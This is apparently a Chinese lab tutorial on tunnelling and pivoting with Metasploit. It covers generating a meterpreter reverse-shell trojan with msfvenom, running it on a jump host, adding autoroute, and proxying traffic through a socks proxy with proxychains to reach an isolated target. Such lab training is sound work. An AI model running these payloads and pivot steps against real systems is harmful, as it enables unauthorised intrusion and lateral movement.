## 一些前缀准备

1、需要四台虚拟机---win10(作为本地主机)、kali(作为vps)、win7(作为跳板)、win2012(作为目标机)

2、我们需要模拟内网主机，需要配置一下虚拟机网卡，让他不出网

编辑---->虚拟网络编辑器---->添加网络

![1667964113_636b1cd136ec2268cceba.png!small?1667964112986](https://image.3001.net/images/20221109/1667964113_636b1cd136ec2268cceba.png!small?1667964112986)

DHCP设置

> 这里的范围随意

![1667964118_636b1cd636dee90332936.png!small?1667964118036](https://image.3001.net/images/20221109/1667964118_636b1cd636dee90332936.png!small?1667964118036)

3、所有的主机都使用NAT模式

4、跳板机需要两张网卡(一张出网(NAT)、一张当内网(12.12.12.0网段的))  
![1667965352_636b21a8e976e0ad91c94.png!small?1667965352872](https://image.3001.net/images/20221109/1667965352_636b21a8e976e0ad91c94.png!small?1667965352872)5、目标机使用小皮面板开个http服务

![1667965035_636b206bf387c1ae4353d.png!small?1667965035913](https://image.3001.net/images/20221109/1667965035_636b206bf387c1ae4353d.png!small?1667965035913)

## 搭建隧道代理

> win7是代理,访问kali自己的1080相当于让win7帮我们访问目标机的80端口

  

  1. kali生成木马用于连接跳板机win7
    
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.250.129 LPORT=7777 -f exe > kali.exe

![](https://image.3001.net/images/20221109/1667964098_636b1cc2f190540081a1a.png!small?1667964098961)

  2. kali开启监听
    
        msfconsole  
    set payload windows/meterpreter/reverse_tcp   
    set lhost eth0  
    set lport 7777  
    run

![1667970104_636b3438d33ad92143178.png!small?1667970104796](https://image.3001.net/images/20221109/1667970104_636b3438d33ad92143178.png!small?1667970104796)

  3. 上线木马

> 将木马放到win7中运行

![](https://image.3001.net/images/20221109/1667964514_636b1e6266c750588d9b1.png!small?1667964514308)

  4. 配置win7的路由

> 保证win7能通win2012
    
        run autoroute -p  
    run autoroute -s 12.12.12.0/24  
    run autoroute -p   
    bg  
    route print

![](https://image.3001.net/images/20221109/1667964614_636b1ec6d5f65d74d2e67.png!small?1667964614797)![](https://image.3001.net/images/20221109/1667964667_636b1efb252f946a14404.png!small?1667964667080)

  5. kali开启隧道
    
        use auxiliary/server/socks_proxy  
    set version 4a  
    run

![](https://image.3001.net/images/20221109/1667964777_636b1f699c38e02729fd4.png!small?1667964777510)

    
        vim /etc/proxychains4.conf  
    socks4 192.168.250.129 1080

![](https://image.3001.net/images/20221109/1667964924_636b1ffc8609e353bed9a.png!small?1667964924442)

  6. kali访问目标机
    
        proxychains  nmap -sT 12.12.12.18 -p 80   或者  
    proxychains firefox 12.12.12.18

> 如果浏览器访问不了，那能探测到80端口的开放就可以了

![](https://image.3001.net/images/20221109/1667965152_636b20e06e51040b07b6e.png!small?1667965152310)

## 通过win10访问目标主机

  1. 开启全局代理让所有流量指向kali机

下载SocksCap(下载exe就好)

<https://github.com/bobo2334/sockscap64/releases>

安装时遇到这个选否

![](https://image.3001.net/images/20221109/1667969136_636b307072b2d41c4d940.png!small?1667969136272)

运行exe  
![1667970677_636b36755b26d2eaa5ae3.png!small?1667970677325](https://image.3001.net/images/20221109/1667970677_636b36755b26d2eaa5ae3.png!small?1667970677325)  
![1667970591_636b361f04407b33b118f.png!small](https://image.3001.net/images/20221109/1667970591_636b361f04407b33b118f.png!small)![1667970649_636b3659db538ccf4c857.png!small?1667970649849](https://image.3001.net/images/20221109/1667970649_636b3659db538ccf4c857.png!small?1667970649849)![1667970739_636b36b343ff2c09b0b46.png!small?1667970739147](https://image.3001.net/images/20221109/1667970739_636b36b343ff2c09b0b46.png!small?1667970739147)![1667970752_636b36c0660dc7bfba0ce.png!small?1667970752451](https://image.3001.net/images/20221109/1667970752_636b36c0660dc7bfba0ce.png!small?1667970752451)![1667970769_636b36d16b9307395dbc0.png!small?1667970769340](https://image.3001.net/images/20221109/1667970769_636b36d16b9307395dbc0.png!small?1667970769340)

  2. 本地使用burp抓包

抓包配置  
![1667970863_636b372fe7602ae2b2a14.png!small?1667970863950](https://image.3001.net/images/20221109/1667970863_636b372fe7602ae2b2a14.png!small?1667970863950)

完成

![1667971022_636b37ce37b4d8f4b9e98.png!small?1667971022132](https://image.3001.net/images/20221109/1667971022_636b37ce37b4d8f4b9e98.png!small?1667971022132)

  

